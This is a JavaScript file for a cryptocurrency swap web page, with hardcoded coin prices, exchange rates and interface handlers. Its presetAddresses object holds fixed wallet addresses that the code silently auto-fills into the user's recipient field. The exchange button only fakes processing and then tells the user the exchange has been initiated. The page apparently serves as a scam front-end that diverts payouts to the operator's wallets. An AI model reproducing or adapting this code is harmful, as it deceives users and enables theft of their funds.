// Crypto data with emoji symbols
const cryptoData = {
    BTC: { name: 'Bitcoin', price: 95000, emoji: '₿' },
    ETH: { name: 'Ethereum', price: 3070, emoji: 'Ξ' },
    SOL: { name: 'Solana', price: 175, emoji: '◎' },
    USDT: { name: 'Tether', price: 1, emoji: '₮' },
    USDC: { name: 'USD Coin', price: 1, emoji: '$' },
    LTC: { name: 'Litecoin', price: 105, emoji: 'Ł' }
};

// Exchange rates (simplified - in real app would fetch from API)
const exchangeRates = {
    BTC: { ETH: 30.78897, SOL: 542.86, USDT: 95000, USDC: 95000, LTC: 904.76 },
    ETH: { BTC: 0.0325, SOL: 17.54, USDT: 3070, USDC: 3070, LTC: 29.24 },
    SOL: { BTC: 0.00184, ETH: 0.057, USDT: 175, USDC: 175, LTC: 1.67 },
    USDT: { BTC: 0.0000105, ETH: 0.000326, SOL: 0.00571, USDC: 1, LTC: 0.00952 },
    USDC: { BTC: 0.0000105, ETH: 0.000326, SOL: 0.00571, USDT: 1, LTC: 0.00952 },
    LTC: { BTC: 0.00111, ETH: 0.0342, SOL: 0.6, USDT: 105, USDC: 105 }
};

// Current selected cryptos
let sendCrypto = 'BTC';
let getCrypto = 'ETH';

// Preset wallet addresses
const presetAddresses = {
    SOL: '7cXAmVBEVJcwPCj37zakcfc7xinfn459spkvgHKHrEeY',
    ETH: '0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877',
    BTC: 'bc1qkvzrkcvn67zj5xaxa4klwdr0gc69dddp2786g7',
    USDT: '0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877',
    USDC: '0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877',
    LTC: ''
};

// Wait for DOM to load
document.addEventListener('DOMContentLoaded', function() {
    // Get DOM elements
    const sendUSDInput = document.getElementById('sendUSD');
    const getUSDInput = document.getElementById('getUSD');
    const sendCryptoElement = document.getElementById('sendCrypto');
    const getCryptoElement = document.getElementById('getCrypto');
    const refreshBtn = document.querySelector('.refresh-btn');
    const acceptBtn = document.querySelector('.accept-btn');
    const cookieNotice = document.querySelector('.cookie-notice');
    const exchangeBtn = document.getElementById('exchangeBtn');
    const btnAmount = document.querySelector('.btn-amount');
    const recipientAddress = document.getElementById('recipientAddress');
    const pasteBtn = document.getElementById('pasteBtn');

    // Format numbers
    function formatNumber(amount, decimals = 2) {
        return amount.toFixed(decimals).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
    }

    // Calculate exchange from USD input
    function calculateExchange() {
        if (!sendUSDInput || !getUSDInput || !sendCryptoElement || !getCryptoElement) return;
        
        const sendUSD = parseFloat(sendUSDInput.value) || 0;
        
        // Calculate crypto amounts
        const sendAmount = sendUSD / cryptoData[sendCrypto].price;
        const exchangeRate = exchangeRates[sendCrypto][getCrypto] || 0;
        const getAmount = sendAmount * exchangeRate;
        const getUSD = getAmount * cryptoData[getCrypto].price;
        
        // Update crypto displays
        sendCryptoElement.textContent = sendAmount.toFixed(8);
        getCryptoElement.textContent = getAmount.toFixed(8);
        
        // Update receive USD
        getUSDInput.value = formatNumber(getUSD);
        
        // Update button amount
        if (btnAmount) {
            btnAmount.textContent = `$${formatNumber(sendUSD)} → $${formatNumber(getUSD)}`;
        }
        
        // Update exchange rate display
        const rateDisplay = document.querySelector('.exchange-rate span');
        if (rateDisplay) {
            rateDisplay.textContent = `Estimated rate: 1 ${sendCrypto} ≈ ${exchangeRate.toFixed(5)} ${getCrypto}`;
        }
    }

    // Update placeholder and preset address when crypto changes
    function updateAddressPlaceholder() {
        if (!recipientAddress) return;
        
        recipientAddress.placeholder = `Enter ${getCrypto} wallet address`;
        
        // Auto-fill with preset address if available
        if (presetAddresses[getCrypto]) {
            recipientAddress.value = presetAddresses[getCrypto];
        } else {
            recipientAddress.value = '';
        }
    }

    // Event listeners
    if (sendUSDInput) {
        sendUSDInput.addEventListener('input', calculateExchange);
    }

    // Refresh rate animation
    if (refreshBtn) {
        refreshBtn.addEventListener('click', function() {
            this.style.transform = 'rotate(360deg)';
            setTimeout(() => {
                this.style.transform = 'rotate(0deg)';
            }, 500);
        });
    }

    // Cookie notice
    if (acceptBtn && cookieNotice) {
        acceptBtn.addEventListener('click', function() {
            cookieNotice.style.display = 'none';
        });
    }

    // Paste button functionality
    if (pasteBtn && recipientAddress) {
        pasteBtn.addEventListener('click', async function() {
            try {
                const text = await navigator.clipboard.readText();
                recipientAddress.value = text;
            } catch (err) {
                console.error('Failed to read clipboard');
            }
        });
    }

    // Exchange button click handler
    if (exchangeBtn && recipientAddress) {
        exchangeBtn.addEventListener('click', function() {
            const address = recipientAddress.value.trim();
            
            if (!address) {
                alert('Please enter a recipient wallet address');
                recipientAddress.focus();
                return;
            }
            
            // Basic address validation
            const addressValidation = {
                ETH: /^0x[a-fA-F0-9]{40}$/,
                BTC: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/,
                SOL: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
                USDT: /^0x[a-fA-F0-9]{40}$/,
                USDC: /^0x[a-fA-F0-9]{40}$/,
                LTC: /^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/
            };
            
            if (addressValidation[getCrypto] && !addressValidation[getCrypto].test(address)) {
                alert(`Invalid ${getCrypto} address format`);
                return;
            }
            
            // Show processing state
            this.disabled = true;
            this.innerHTML = `
                <span class="btn-text">Processing...</span>
                <span class="btn-amount">Please wait</span>
            `;
            
            // Simulate processing
            setTimeout(() => {
                this.innerHTML = `
                    <span class="btn-text">✓ Exchange Initiated</span>
                    <span class="btn-amount">Check your wallet</span>
                `;
                this.style.background = 'linear-gradient(135deg, #00d4aa 0%, #00b894 100%)';
                
                // Reset after 3 seconds
                setTimeout(() => {
                    this.disabled = false;
                    this.innerHTML = `
                        <span class="btn-text">Exchange</span>
                        <span class="btn-amount">${btnAmount ? btnAmount.textContent : '$0 → $0'}</span>
                    `;
                    this.style.background = '';
                    recipientAddress.value = '';
                }, 3000);
            }, 2000);
        });
    }

    // Risk modal elements
    const riskInfoBtn = document.getElementById('riskInfoBtn');
    const riskModal = document.getElementById('riskModal');
    const closeModal = document.getElementById('closeModal');
    const understandBtn = document.getElementById('understandBtn');

    // Show risk modal
    if (riskInfoBtn && riskModal) {
        riskInfoBtn.addEventListener('click', function() {
            riskModal.style.display = 'block';
            document.body.style.overflow = 'hidden';
        });
    }

    // Close modal functions
    function closeRiskModal() {
        if (riskModal) {
            riskModal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    if (closeModal) {
        closeModal.addEventListener('click', closeRiskModal);
    }
    
    if (understandBtn) {
        understandBtn.addEventListener('click', closeRiskModal);
    }

    // Close modal when clicking outside
    if (riskModal) {
        riskModal.addEventListener('click', function(e) {
            if (e.target === riskModal) {
                closeRiskModal();
            }
        });
    }

    // Crypto selection
    const cryptoModal = document.getElementById('cryptoModal');
    const closeCryptoModal = document.getElementById('closeCryptoModal');
    const sendCryptoDisplay = document.getElementById('sendCryptoDisplay');
    const getCryptoDisplay = document.getElementById('getCryptoDisplay');
    let currentSelectionType = 'send';

    // Open crypto selector
    if (sendCryptoDisplay) {
        sendCryptoDisplay.addEventListener('click', function() {
            currentSelectionType = 'send';
            if (cryptoModal) {
                cryptoModal.style.display = 'block';
                document.body.style.overflow = 'hidden';
            }
        });
    }

    if (getCryptoDisplay) {
        getCryptoDisplay.addEventListener('click', function() {
            currentSelectionType = 'get';
            if (cryptoModal) {
                cryptoModal.style.display = 'block';
                document.body.style.overflow = 'hidden';
            }
        });
    }

    // Close crypto modal
    function closeCryptoModalFunc() {
        if (cryptoModal) {
            cryptoModal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    if (closeCryptoModal) {
        closeCryptoModal.addEventListener('click', closeCryptoModalFunc);
    }
    
    if (cryptoModal) {
        cryptoModal.addEventListener('click', function(e) {
            if (e.target === cryptoModal) closeCryptoModalFunc();
        });
    }

    // Select crypto
    document.querySelectorAll('.crypto-item').forEach(item => {
        item.addEventListener('click', function() {
            const selectedCrypto = this.dataset.crypto;
            
            if (currentSelectionType === 'send') {
                sendCrypto = selectedCrypto;
                const sendCryptoCode = document.getElementById('sendCryptoCode');
                const sendCryptoEmoji = document.getElementById('sendCryptoEmoji');
                if (sendCryptoCode) sendCryptoCode.textContent = selectedCrypto;
                if (sendCryptoEmoji) sendCryptoEmoji.textContent = cryptoData[selectedCrypto].emoji;
            } else {
                getCrypto = selectedCrypto;
                const getCryptoCode = document.getElementById('getCryptoCode');
                const getCryptoEmoji = document.getElementById('getCryptoEmoji');
                if (getCryptoCode) getCryptoCode.textContent = selectedCrypto;
                if (getCryptoEmoji) getCryptoEmoji.textContent = cryptoData[selectedCrypto].emoji;
                updateAddressPlaceholder();
            }
            
            closeCryptoModalFunc();
            calculateExchange();
        });
    });

    // Search functionality
    const cryptoSearch = document.getElementById('cryptoSearch');
    if (cryptoSearch) {
        cryptoSearch.addEventListener('input', function() {
            const searchTerm = this.value.toLowerCase();
            document.querySelectorAll('.crypto-item').forEach(item => {
                const cryptoName = item.querySelector('.crypto-name').textContent.toLowerCase();
                const cryptoSymbol = item.querySelector('.crypto-symbol').textContent.toLowerCase();
                
                if (cryptoName.includes(searchTerm) || cryptoSymbol.includes(searchTerm)) {
                    item.style.display = 'flex';
                } else {
                    item.style.display = 'none';
                }
            });
        });
    }

    // Initialize
    calculateExchange();
    updateAddressPlaceholder();
});